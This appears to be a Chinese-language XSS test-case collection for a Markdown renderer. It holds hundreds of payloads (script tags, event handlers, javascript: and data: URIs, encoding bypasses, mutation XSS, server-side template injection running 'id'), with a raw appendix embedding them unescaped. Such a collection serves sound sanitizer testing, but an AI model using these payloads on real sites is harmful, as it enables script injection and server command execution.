# XSS 攻击测试用例集（Markdown 渲染器安全测试）

> 本文档用于测试 Markdown 渲染器对 XSS 攻击的防御能力，覆盖多种攻击边界。
> 所有 payload 均以代码块形式展示，便于复制测试。

---

## 1. 基础 Script 标签注入

### 1.1 直接 script 标签

```html
<script>alert('XSS')</script>
```

### 1.2 大小写混淆

```html
<ScRiPt>alert('XSS')</ScRiPt>
```

```html
<SCRIPT>alert('XSS')</SCRIPT>
```

```html
<sCrIpT>alert('XSS')</sCrIpT>
```

### 1.3 多余空格 / 换行

```html
<script >alert('XSS')</script>
```

```html
<script
>alert('XSS')</script
>
```

### 1.4 嵌套 script

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### 1.5 注释绕过

```html
<!--><script>alert('XSS')</script>-->
```

```html
<script><!-- alert('XSS') --></script>
```

---

## 2. 事件处理器注入

### 2.1 常见事件

```html
<img src=x onerror=alert('XSS')>
```

```html
<img src=x onerror="alert('XSS')">
```

```html
<img src=x onerror='alert("XSS")'>
```

### 2.2 多种标签 + 事件组合

```html
<body onload=alert('XSS')>
```

```html
<div onmouseover=alert('XSS')>Hover me</div>
```

```html
<input onfocus=alert('XSS') autofocus>
```

```html
<marquee onstart=alert('XSS')>XSS</marquee>
```

```html
<details open ontoggle=alert('XSS')>test</details>
```

```html
<video><source onerror=alert('XSS')>
```

```html
<audio src=x onerror=alert('XSS')>
```

```html
<svg onload=alert('XSS')>
```

```html
<textarea onfocus=alert('XSS') autofocus>
```

```html
<select onfocus=alert('XSS') autofocus>
```

```html
<keygen onfocus=alert('XSS') autofocus>
```

```html
<meter onmouseover=alert('XSS')>0</meter>
```

### 2.3 不常见事件处理器

```html
<img src=x onloadstart=alert('XSS')>
<img src=x onabort=alert('XSS')>
<img src=x onresize=alert('XSS')>
<img src=x onscroll=alert('XSS')>
<img src=x onpointerover=alert('XSS')>
<img src=x ontouchstart=alert('XSS')>
```

---

## 3. 链接与 URL 注入

### 3.1 javascript: 协议

```markdown
[Click me](javascript:alert('XSS'))
```

```html
<a href="javascript:alert('XSS')">Click me</a>
```

```html
<a href="javascript&#58;alert('XSS')">Click me</a>
```

### 3.2 大小写与空白绕过

```markdown
[Click](JaVaScRiPt:alert('XSS'))
```

```markdown
[Click](  javascript:alert('XSS'))
```

```html
<a href="javascript&#x3A;alert('XSS')">Click</a>
```

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')">Click</a>
```

### 3.3 data: URI

```markdown
[Click](data:text/html,<script>alert('XSS')</script>)
```

```markdown
[Click](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)
```

### 3.4 vbscript / livescript（IE 环境）

```markdown
[Click](vbscript:MsgBox('XSS'))
```

```markdown
[Click](livescript:alert('XSS'))
```

### 3.5 自动链接

```markdown
<javascript:alert('XSS')>
```

---

## 4. 图片与媒体标签注入

### 4.1 img 标签

```html
<img src="javascript:alert('XSS')">
```

```html
<img src=javascript:alert('XSS')>
```

```html
<img dynsrc="javascript:alert('XSS')">
```

```html
<img lowsrc="javascript:alert('XSS')">
```

```html
<img src="x" onerror="alert('XSS')">
```

### 4.2 SVG 注入

```html
<svg><script>alert('XSS')</script></svg>
```

```html
<svg/onload=alert('XSS')>
```

```html
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
```

```html
<svg><set onbegin=alert('XSS') attributeName=x to=1>
```

```html
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert('XSS')"><rect width=100 height=100/></a></svg>
```

### 4.3 MathML

```html
<math><maction actiontype="statusline#" xlink:href="javascript:alert('XSS')">XSS</maction></math>
```

---

## 5. HTML 属性注入

### 5.1 属性值闭合绕过

```html
<a href="x" onclick="alert('XSS')">click</a>
```

```html
<a href='x' onclick='alert("XSS")'>click</a>
```

```html
<a href=x onclick=alert('XSS')>click</a>
```

### 5.2 反引号绕过

```html
<a href=`javascript:alert('XSS')`>click</a>
```

### 5.3 style 属性

```html
<div style="background:url(javascript:alert('XSS'))">test</div>
```

```html
<div style="width:expression(alert('XSS'))">test</div>
```

```html
<div style="behavior:url(xss.htc)">test</div>
```

```html
<div style="-moz-binding:url(xss.xml#xss)">test</div>
```

### 5.4 class/id 注入

```html
<div id="x" style="background:url('javascript:alert(1)')">test</div>
```

---

## 6. 编码绕过

### 6.1 HTML 实体编码

```html
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

```html
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

### 6.2 Unicode 编码

```html
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074('XSS')>
```

### 6.3 URL 编码

```html
<a href="java%73cript:alert('XSS')">click</a>
```

```html
<a href="javascript:%61lert('XSS')">click</a>
```

```html
<a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29">click</a>
```

### 6.4 双重编码

```html
<a href="javascript%253Aalert('XSS')">click</a>
```

### 6.5 混合编码

```html
<a href="j&#x61;v&#97;script:alert('XSS')">click</a>
```

### 6.6 空字节注入

```html
<scri\x00pt>alert('XSS')</script>
```

```html
<a href="java\0script:alert('XSS')">click</a>
```

---

## 7. CSS 注入

### 7.1 style 标签

```html
<style>body{background:url("javascript:alert('XSS')")}</style>
```

```html
<style>*{xss:expression(alert('XSS'))}</style>
```

### 7.2 @import

```html
<style>@import url("javascript:alert('XSS')");</style>
```

```html
<style>@import 'data:text/css,body{background:url("javascript:alert(1)")}';</style>
```

### 7.3 link 标签

```html
<link rel="stylesheet" href="javascript:alert('XSS')">
```

```html
<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">
```

---

## 8. iframe / object / embed 注入

### 8.1 iframe

```html
<iframe src="javascript:alert('XSS')"></iframe>
```

```html
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

```html
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
```

```html
<iframe src="javascript:alert('XSS')" style="width:0;height:0;border:0;"></iframe>
```

### 8.2 object / embed

```html
<object data="javascript:alert('XSS')"></object>
```

```html
<embed src="javascript:alert('XSS')">
```

```html
<object data="data:text/html,<script>alert('XSS')</script>"></object>
```

### 8.3 applet

```html
<applet code="javascript:alert('XSS')"></applet>
```

---

## 9. 表单劫持

### 9.1 form + action

```html
<form action="javascript:alert('XSS')"><input type="submit"></form>
```

```html
<form><button formaction="javascript:alert('XSS')">click</button></form>
```

### 9.2 isindex

```html
<isindex action="javascript:alert('XSS')">
```

### 9.3 base 标签劫持

```html
<base href="javascript:alert('XSS')">
```

```html
<base href="https://evil.example.com/">
```

---

## 10. Meta 标签注入

```html
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
```

```html
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS')</script>">
```

```html
<meta http-equiv="Set-Cookie" content="session=evil">
```

---

## 11. Markdown 特有攻击面

### 11.1 图片引用

```markdown
![alt](javascript:alert('XSS'))
```

```markdown
![alt](data:text/html,<script>alert('XSS')</script>)
```

```markdown
![alt](x "onerror=alert('XSS'))
```

### 11.2 引用 title 属性注入

```markdown
[Click](http://example.com "onmouseover=alert('XSS')")
```

```markdown
![img](http://example.com/img.png "onmouseover=alert('XSS')")
```

### 11.3 参考式链接

```markdown
[xss]: javascript:alert('XSS')
[Click][xss]
```

```markdown
[xss2]: data:text/html,<script>alert('XSS')</script>
[Click][xss2]
```

### 11.4 自动链接注入

```markdown
<javascript:alert('XSS')>
```

### 11.5 脚注注入

```markdown
这是一段正文[^1]。

[^1]: <script>alert('XSS')</script>
```

### 11.6 代码块逃逸

````markdown
```
" onfocus="alert('XSS')" autofocus="
```
````

```markdown
`` ` ``<script>alert('XSS')</script>`` ` ``
```

### 11.7 HTML 块注入

```html
<div>
<script>alert('XSS')</script>
</div>
```

### 11.8 表格内注入

```markdown
| Header | Value |
|--------|-------|
| Test | <img src=x onerror=alert('XSS')> |
| Test | <a href="javascript:alert('XSS')">click</a> |
| Test | `<script>alert('XSS')</script>` |
```

---

## 12. DOM 型 XSS 测试

### 12.1 location / hash

```html
<a href="#" onclick="eval(location.hash.slice(1))">click</a>
```

### 12.2 document.write

```html
<script>document.write(location.search)</script>
```

### 12.3 innerHTML

```html
<div id="output"></div>
<script>document.getElementById('output').innerHTML = location.hash.slice(1)</script>
```

---

## 13. 模板注入（框架相关）

### 13.1 AngularJS

```text
{{constructor.constructor('alert(1)')()}}
```

```text
{{$on.constructor('alert(1)')()}}
```

### 13.2 Vue.js

```text
{{_c.constructor('alert(1)')()}}
```

### 13.3 ERB / Jinja

```erb
<%= system('id') %>
```

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

---

## 14. 特殊字符与边界

### 14.1 零宽字符

```text
java[U+200B]script:alert('XSS')  （包含零宽空格 U+200B）
```

```text
java[U+00AD]script:alert('XSS')  （包含软连字符 U+00AD）
```

### 14.2 换行 / 回车绕过

```html
<a href="java
script:alert('XSS')">click</a>
```

```html
<a href="java&#x0d;script:alert('XSS')">click</a>
```

```html
<a href="java&#x0a;script:alert('XSS')">click</a>
```

### 14.3 Tab 字符

```html
<a href="java	script:alert('XSS')">click</a>
```

### 14.4 BOM (Byte Order Mark)

```html
﻿<script>alert('XSS')</script>
```

### 14.5 右到左覆盖 (RTL Override)

```html
‮<script>alert('XSS')</script>
```

---

## 15. CSP 绕过测试

### 15.1 JSONP callback

```html
<script src="https://example.com/api?callback=alert(1)//"></script>
```

### 15.2 base-uri 缺失

```html
<base href="https://evil.example.com/">
<script src="/safe.js"></script>
```

---

## 16. Mutation XSS (mXSS)

### 16.1 使用 DOMPurify 可能遗漏的情况

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>
```

```html
<svg><style><img src="</style><img src=x onerror=alert('XSS')>">
```

```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('XSS')>
```

### 16.2 命名空间混淆

```html
<svg><foreignObject><div><img src=x onerror=alert('XSS')></div></foreignObject></svg>
```

```html
<math><annotation-xml encoding="text/html"><img src=x onerror=alert('XSS')></annotation-xml></math>
```

---

## 17. 其他攻击向量

### 17.1 XML 数据岛

```html
<xml><script>alert('XSS')</script></xml>
```

### 17.2 VML（IE）

```html
<v:rect style="width:100;height:100" stroked="f"><v:fill src="javascript:alert('XSS')"></v:fill></v:rect>
```

### 17.3 元素闭合绕过

```html
</script><script>alert('XSS')</script>
```

```html
</title><script>alert('XSS')</script>
```

```html
</textarea><script>alert('XSS')</script>
```

### 17.4 事件属性 + 多种标签

```html
<bgsound src="javascript:alert('XSS')">
<layer src="javascript:alert('XSS')">
<table background="javascript:alert('XSS')">
<td background="javascript:alert('XSS')">
```

---

## 测试总结

| 类别 | 测试数量 | 说明 |
|------|---------|------|
| Script 标签注入 | 8+ | 直接注入、大小写、空格、嵌套、注释 |
| 事件处理器 | 20+ | 多标签 × 多事件组合 |
| URL 协议注入 | 12+ | javascript/data/vbscript 协议 |
| 图片媒体标签 | 10+ | img/svg/math/video/audio |
| 编码绕过 | 10+ | HTML/Unicode/URL/双重/混合编码 |
| CSS 注入 | 6+ | style/import/link |
| iframe/object/embed | 7+ | 各种嵌入标签 |
| 表单劫持 | 4+ | form/button/base |
| Markdown 特有 | 10+ | 链接/图片/脚注/表格/代码块 |
| DOM XSS | 3+ | location/document.write/innerHTML |
| 模板注入 | 4+ | Angular/Vue/ERB/Jinja |
| 特殊字符 | 6+ | 零宽/换行/Tab/BOM/RTL |
| Mutation XSS | 4+ | 命名空间混淆/解析器差异 |
| 裸 payload（非代码块）| 50+ | 直接嵌入原始 HTML 和 Markdown |

---
---

# 附录：裸 Payload 实战测试区（非代码块）

> **以下所有 payload 均直接写在 Markdown 中，不使用代码块包裹。**
> 用于测试渲染器是否能正确过滤/转义这些内容。

---

## A1. Script 标签 — 直接注入

<script>alert('XSS-A1-1')</script>

<ScRiPt>alert('XSS-A1-2')</ScRiPt>

<SCRIPT>alert('XSS-A1-3')</SCRIPT>

<script >alert('XSS-A1-4')</script >

<script
>alert('XSS-A1-5')</script
>

<scr<script>ipt>alert('XSS-A1-6')</scr</script>ipt>

<!--><script>alert('XSS-A1-7')</script>-->

---

## A2. 事件处理器 — 裸标签

<img src=x onerror=alert('XSS-A2-1')>

<img src=x onerror="alert('XSS-A2-2')">

<img src=x onerror='alert("XSS-A2-3")'>

<img/src=x onerror=alert('XSS-A2-4')>

<body onload=alert('XSS-A2-5')>

<div onmouseover=alert('XSS-A2-6')>将鼠标移到这里</div>

<input onfocus=alert('XSS-A2-7') autofocus>

<details open ontoggle=alert('XSS-A2-8')>展开详情</details>

<marquee onstart=alert('XSS-A2-9')>滚动文本</marquee>

<video><source onerror=alert('XSS-A2-10')>

<audio src=x onerror=alert('XSS-A2-11')>

<textarea onfocus=alert('XSS-A2-12') autofocus>

<select onfocus=alert('XSS-A2-13') autofocus>

<meter onmouseover=alert('XSS-A2-14')>0</meter>

<isindex type=image src=1 onerror=alert('XSS-A2-15')>

---

## A3. SVG / MathML — 裸注入

<svg onload=alert('XSS-A3-1')>

<svg/onload=alert('XSS-A3-2')>

<svg><script>alert('XSS-A3-3')</script></svg>

<svg><animate onbegin=alert('XSS-A3-4') attributeName=x dur=1s>

<svg><set onbegin=alert('XSS-A3-5') attributeName=x to=1>

<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert('XSS-A3-6')"><rect width=100 height=100/></a></svg>

<svg><foreignObject><div><img src=x onerror=alert('XSS-A3-7')></div></foreignObject></svg>

<math><maction actiontype="statusline#" xlink:href="javascript:alert('XSS-A3-8')">hover me</maction></math>

<math><annotation-xml encoding="text/html"><img src=x onerror=alert('XSS-A3-9')></annotation-xml></math>

---

## A4. 链接协议 — Markdown 语法

[javascript 协议](javascript:alert('XSS-A4-1'))

[大小写绕过](JaVaScRiPt:alert('XSS-A4-2'))

[data URI](data:text/html,<script>alert('XSS-A4-3')</script>)

[data base64](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLUE0LTQnKTwvc2NyaXB0Pg==)

[vbscript](vbscript:MsgBox('XSS-A4-5'))

[实体编码](javascript&#58;alert('XSS-A4-6'))

[十六进制实体](javascript&#x3A;alert('XSS-A4-7'))

[全实体编码](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS-A4-8'))

[前置空格](  javascript:alert('XSS-A4-9'))

---

## A5. 图片 — Markdown 语法

![XSS](javascript:alert('XSS-A5-1'))

![XSS](data:text/html,<script>alert('XSS-A5-2')</script>)

![XSS](x "onerror=alert('XSS-A5-3'))

![XSS](http://example.com/img.png "onmouseover=alert('XSS-A5-4')")

---

## A6. 参考式链接

[refxss1]: javascript:alert('XSS-A6-1')
[refxss2]: data:text/html,<script>alert('XSS-A6-2')</script>
[refxss3]: javascript:alert('XSS-A6-3') "onmouseover=alert('XSS-A6-3t')"

[点击测试 refxss1][refxss1]

[点击测试 refxss2][refxss2]

[点击测试 refxss3][refxss3]

---

## A7. 自动链接

<javascript:alert('XSS-A7-1')>

<data:text/html,<script>alert('XSS-A7-2')</script>>

---

## A8. HTML 属性注入 — 裸写

<a href="javascript:alert('XSS-A8-1')">点击我</a>

<a href="x" onclick="alert('XSS-A8-2')">点击我</a>

<a href='x' onclick='alert("XSS-A8-3")'>点击我</a>

<a href=x onclick=alert('XSS-A8-4')>点击我</a>

<a href=`javascript:alert('XSS-A8-5')`>反引号链接</a>

<a href="java
script:alert('XSS-A8-6')">换行绕过</a>

<a href="java&#x0d;script:alert('XSS-A8-7')">CR绕过</a>

<a href="java&#x0a;script:alert('XSS-A8-8')">LF绕过</a>

<a href="j&#x61;v&#97;script:alert('XSS-A8-9')">混合编码</a>

<a href="java%73cript:alert('XSS-A8-10')">URL编码</a>

<a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29">全URL编码</a>

---

## A9. iframe / object / embed — 裸写

<iframe src="javascript:alert('XSS-A9-1')"></iframe>

<iframe src="data:text/html,<script>alert('XSS-A9-2')</script>"></iframe>

<iframe srcdoc="<script>alert('XSS-A9-3')</script>"></iframe>

<iframe src="javascript:alert('XSS-A9-4')" style="width:0;height:0;border:0;"></iframe>

<object data="javascript:alert('XSS-A9-5')"></object>

<embed src="javascript:alert('XSS-A9-6')">

<object data="data:text/html,<script>alert('XSS-A9-7')</script>"></object>

<applet code="javascript:alert('XSS-A9-8')"></applet>

---

## A10. CSS 注入 — 裸写

<style>body{background:url("javascript:alert('XSS-A10-1')")}</style>

<style>*{xss:expression(alert('XSS-A10-2'))}</style>

<style>@import url("javascript:alert('XSS-A10-3')");</style>

<style>@import 'data:text/css,body{background:url("javascript:alert(1)")}';</style>

<link rel="stylesheet" href="javascript:alert('XSS-A10-5')">

<div style="background:url(javascript:alert('XSS-A10-6'))">CSS背景测试</div>

<div style="width:expression(alert('XSS-A10-7'))">expression测试</div>

<div style="behavior:url(xss.htc)">behavior测试</div>

<div style="-moz-binding:url(xss.xml#xss)">moz-binding测试</div>

---

## A11. 表单劫持 — 裸写

<form action="javascript:alert('XSS-A11-1')"><input type="submit" value="提交"></form>

<form><button formaction="javascript:alert('XSS-A11-2')">点击</button></form>

<isindex action="javascript:alert('XSS-A11-3')">

<base href="javascript:alert('XSS-A11-4')">

---

## A12. Meta 标签 — 裸写

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS-A12-1')">

<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS-A12-2')</script>">

<meta http-equiv="Set-Cookie" content="session=evil_A12_3">

---

## A13. 编码绕过 — 裸写

&#60;script&#62;alert('XSS-A13-1')&#60;/script&#62;

&#x3C;script&#x3E;alert('XSS-A13-2')&#x3C;/script&#x3E;

<img src=x onerror=\u0061\u006C\u0065\u0072\u0074('XSS-A13-3')>

<scri\x00pt>alert('XSS-A13-4')</script>

<a href="java\0script:alert('XSS-A13-5')">空字节注入</a>

---

## A14. Mutation XSS (mXSS) — 裸写

<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS-A14-1')>

<svg><style><img src="</style><img src=x onerror=alert('XSS-A14-2')>">

<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('XSS-A14-3')>

---

## A15. 模板语法 — 裸写

{{constructor.constructor('alert("XSS-A15-1")')()}}

{{$on.constructor('alert("XSS-A15-2")')()}}

{{_c.constructor('alert("XSS-A15-3")')()}}

<%= system('id') %>

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

${alert('XSS-A15-6')}

${7*7}

#{alert('XSS-A15-8')}

---

## A16. 元素闭合与标签拼接 — 裸写

</script><script>alert('XSS-A16-1')</script>

</title><script>alert('XSS-A16-2')</script>

</textarea><script>alert('XSS-A16-3')</script>

</style><script>alert('XSS-A16-4')</script>

</noscript><script>alert('XSS-A16-5')</script>

---

## A17. 表格内裸 payload

| 列1 | 列2 | 列3 |
|-----|-----|-----|
| 普通文本 | <script>alert('XSS-A17-1')</script> | 测试 |
| 普通文本 | <img src=x onerror=alert('XSS-A17-2')> | 测试 |
| 普通文本 | <a href="javascript:alert('XSS-A17-3')">click</a> | 测试 |
| 普通文本 | <svg onload=alert('XSS-A17-4')> | 测试 |
| 普通文本 | <details open ontoggle=alert('XSS-A17-5')>x</details> | 测试 |
| 普通文本 | <iframe src="javascript:alert('XSS-A17-6')"> | 测试 |

---

## A18. 脚注注入 — 裸写

这是一段正常文本[^xss1]，还有更多[^xss2]以及[^xss3]。

[^xss1]: <script>alert('XSS-A18-1')</script>
[^xss2]: <img src=x onerror=alert('XSS-A18-2')>
[^xss3]: [evil](javascript:alert('XSS-A18-3'))

---

## A19. 混合 Markdown + HTML 裸 payload

**加粗文本** <script>alert('XSS-A19-1')</script> **继续加粗**

*斜体文本* <img src=x onerror=alert('XSS-A19-2')> *继续斜体*

~~删除线~~ <svg onload=alert('XSS-A19-3')> ~~继续删除线~~

> 引用块内 <script>alert('XSS-A19-4')</script>

> 引用块内 <img src=x onerror=alert('XSS-A19-5')>

- 列表项 <script>alert('XSS-A19-6')</script>
- 列表项 <img src=x onerror=alert('XSS-A19-7')>
- 列表项 <a href="javascript:alert('XSS-A19-8')">点击</a>

1. 有序列表 <script>alert('XSS-A19-9')</script>
2. 有序列表 <img src=x onerror=alert('XSS-A19-10')>

---

## A20. 其他冷门标签 — 裸写

<bgsound src="javascript:alert('XSS-A20-1')">

<layer src="javascript:alert('XSS-A20-2')">

<table background="javascript:alert('XSS-A20-3')"><tr><td>表格背景</td></tr></table>

<td background="javascript:alert('XSS-A20-4')">

<xml><script>alert('XSS-A20-5')</script></xml>

<v:rect style="width:100;height:100" stroked="f"><v:fill src="javascript:alert('XSS-A20-6')"></v:fill></v:rect>

<image src="javascript:alert('XSS-A20-7')">

<x onclick=alert('XSS-A20-8')>自定义标签</x>

<plaintext>alert('XSS-A20-9')

<xmp><script>alert('XSS-A20-10')</script></xmp>

<noscript><img src=x onerror=alert('XSS-A20-11')></noscript>
| 其他向量 | 6+ | XML/VML/元素闭合 |